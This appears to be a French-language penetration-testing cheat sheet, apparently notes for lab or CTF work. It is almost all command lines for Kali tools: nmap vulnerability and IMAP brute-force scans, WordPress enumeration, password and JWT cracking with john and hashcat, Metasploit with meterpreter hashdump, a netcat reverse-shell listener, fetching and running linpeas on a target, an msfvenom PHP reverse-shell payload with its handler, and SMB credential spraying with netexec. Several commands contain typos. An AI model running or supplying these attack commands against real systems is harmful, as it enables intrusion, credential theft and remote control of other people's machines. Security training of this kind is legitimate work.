## Wordlists

Sur Kali : 
`/usr/share/wordlists/`  
`/usr/share/wordlists/dirbuster/`


## nmap

trouver les vulnérabilités  
`nmap -sC -sV -O 10.10.0.0-255 –script=vuln`


Brute force srv mail  
`nmap -p 143 --script=imap-brute --script-args userbdb=userfilename, passdb=dict.txt ip`k

wordpress
```
find / -name *wordpress*.nse

nmap -p 80 ip --script=http-wordpress-users # trouver les users

nmap -p 80 ip --script=http-wordpress-enum # trouver les plugins installés
```

## john

``john --wordlist=wordlist_file.txt file_to_crack``

```
#file_to_crack

user:hash
user2:hash2

```

jwt en sha256
```
cat > /tmp/hash << EOF
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhZG1pbiI6MCwiZXhwIjoxNzI4ODA5ODM2fQ.wcMEZhrZRprqy8-a2fC2sbvsWrNUBcj3gpf9epyssck
EOF
john /tmp/hash --format=HMAC-SHA256
```

## hashcat

```
hascat -h | grep MD5

hashcat -m 0 file dict1 dict2 dict3
```

## hydra
brute force web

## Metasploit

```
msfconsole
search {vuln_name} # ex ms17-010

use {n}
set lhost {ip}
set rhost {ip_cible}
options # check of others parameters

run
```

une fois sur l'host meterpreter est lancé, on peut lancer un shell depuis celui ci.

``meterpreter> hashdump`` # récupère les hash de la machine

Sur une machine windows
Nom_Utilisateur:RID:Hash_LM:Hash_NTLM

lors d'un hashdump, on se concentre sur la dernière partie (le hash NTLM) car le hash LM qui le précède est une antiquité inutile et non sécurisée, souvent même pas présente sur les systèmes récents. C'est le hash NTLM qui représente la clé d'accès au compte.


``meterpreter> search -f flag*``

## gobuster
Dir discovery
`gobuster dir -w path/to/wordlist -u url`

## dirb
Dir discovery
`dirb url`

## Kiterunner
Dir discovery

https://github.com/assetnote/kiterunner

## burp
intercepter et modifier des requêtes http
`burpsuite`

## netcat

Ecouter un reverse shell  # peut etre aussi fait avec msfconsole
`nc -nlvp 1234` 

## linpeas

``wget -O url/linpeas.sh``  
Pour l'envoyer sur la machine cible  
`python3 -m http.server 8081`

sur le reverse shell
```
wget -O linpeas.sh http://ip_machine:8081/linpeas.sh

chmod +x linpeas.sh
./linpeas.sh
```

## wpscan
une fois qu'on a des users wordpress  
`wpscan --url url -U wp_user_file -P dic_file -v`


# emlAnalyzer

`emlAnalyzer -i mail_file`  
Extraire une pj
`emlAnalyzer -i mail_file -ea 1`

# zip2jhon

zip protegé par un mdp

```
zip2jhon secret.zip > hashzip
john --wordlist=/isr/share/wordlists/rockyou.txt hashzip
```

`unzip secret.zip`

# ssh2john
Quand une secret key a une passphrase

```
ssh2john id_rsa > hash_ssh
john hash_ssh --wordlist=/usr/share/wordlists/john.lst
```

## nikto
sur un serveur web
`nikto -h ip:port`


# msfvenom
création d'un payload pour reverse shell
`msfvenom -p php/meterpreter/reverse_tcp lhost=ip_host lport=443 -o reverse.php`

puis avec msfconsole
```
msfconsole
use exploit/multi/handler
msf exploit(multi/handler) > set payload php/meterpreter/reverse_tcp
payload => php/meterpreter/reverse_tcp
msf exploit(multi/handler) > set lport 443
lport => 443
msf exploit(multi/handler) > set lhost 192.168.1.128
lhost => 192.168.1.128
run
```

## netexec
`nxc smb 10.10.0.0/24 -u creds.txt -p passwords.txt --local-auth`